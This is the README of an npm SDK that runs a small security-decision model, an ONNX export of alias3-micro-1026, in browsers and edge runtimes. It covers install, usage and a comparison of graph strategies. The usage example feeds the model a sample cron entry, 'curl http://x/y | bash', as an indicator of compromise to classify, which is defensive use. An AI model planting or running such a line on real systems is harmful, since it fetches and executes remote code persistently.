# ct0-edge

On-device SDK (browser, Node, edge) for **CT0 / alias3-micro-1026** running as ONNX over
[onnxruntime-web](https://onnxruntime.ai/) (WebGPU / WASM). One model, both modes:

- **System 1 — `decide()`**: a yes/no security decision in a single forward (reads logits, no tokens generated).
- **System 2 — `generate()` / `Chat`**: autoregressive generation (streaming).
- **Gate**: escalate from System 1 to System 2 when confidence is below a threshold.

By default it drives the **decode-only recurrent graph** (`real_decode_fx_int4`, ~3.3 GB) — the
graph that actually fits the browser's ~4 GB WASM cap and decodes at O(1)/token. It does **not**
require the transformers.js model-support PR to be merged.

Model weights: **[eduardoworrel/ct0-alias3-micro-onnx](https://huggingface.co/eduardoworrel/ct0-alias3-micro-onnx)**
(ONNX export of [aliasrobotics/alias3-micro-1026](https://huggingface.co/aliasrobotics/alias3-micro-1026) — all model credit to Alias Robotics).

## Install

```bash
npm i ct0-edge @huggingface/transformers onnxruntime-web
```

## Use

```js
import { CT0 } from "ct0-edge";

const ct0 = await CT0.load({ repo: "eduardoworrel/ct0-alias3-micro-onnx", onStatus: console.log });

// System 1 — decision (one forward, reads logits)
const p = await ct0.decide("path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
                           "Is this a suspicious indicator of compromise?");
console.log("P(yes) =", p);

// Gate + System 2
if (Math.abs(2 * p - 1) < 0.6) {                 // low confidence → escalate
  for await (const piece of ct0.generate("Explain the reasoning.")) process.stdout.write(piece);
}
```

## Graph strategies (why decode-only)

A 4B model must fit under the browser's ~4 GB WASM cap. We evaluated several ONNX graphs:

| strategy | `Scan`? | fits < 4 GB | fidelity (q4, /16) | context | browser decode |
|---|---|---|---|---|---|
| **decode-only** (default here) | no | ✓ 3.28 GB | 9/16 | unbounded | fast |
| **two-graph** (prefill + decode) | no | ✓ 3.38 + 3.28 GB | 9/16; combined pending | unbounded | fast prefill |
| **single_chunk** (fixed window) | no | ✓ 3.17 GB | 14/16 | capped 64 | fast |
| **scan** (`generate()`, any chunk) | yes | ✓ 3.17 GB\* | 14/16 | unbounded | slow |
| int8 weight-only | yes | ✗ 4.95 GB | 16/16 | unbounded | — |

**Key finding:** at q4 (the quant that fits the browser) fidelity is ~14/16 regardless of scan vs
non-scan or chunk size — the int4 error dominates; 16/16 only shows up at int8/fp16, which don't fit.
So the strategies differ on **speed and context**, not fidelity.

\* The scan `model_q4.onnx` currently published on HF is **4.78 GB and does _not_ fit the browser**;
the fitting 3.17 GB q4f16-b64 scan build is a research result, not yet uploaded. Browser **tok/s** is
a pending WebGPU measurement.

## Related

- ONNX export (optimum): https://github.com/huggingface/optimum-onnx/pull/152
- transformers.js support: https://github.com/huggingface/transformers.js/pull/1803

## License

MIT (this SDK). The **model** weights follow the license of the
[base model](https://huggingface.co/aliasrobotics/alias3-micro-1026).
